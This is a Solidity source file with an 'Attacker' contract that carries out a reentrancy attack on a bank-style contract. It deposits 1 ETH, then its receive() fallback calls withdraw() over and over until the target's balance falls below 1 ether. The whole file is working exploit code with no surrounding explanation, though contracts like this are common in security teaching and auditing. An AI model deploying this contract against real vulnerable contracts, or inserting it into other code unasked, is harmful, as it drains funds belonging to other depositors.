// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IBank public bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    receive() external payable {
        // Re-enter before the target contract updates balances
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send exactly 1 ETH");

        // Deposit ETH into vulnerable contract
        bank.deposit{value: 1 ether}();

        // Trigger recursive withdrawals
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
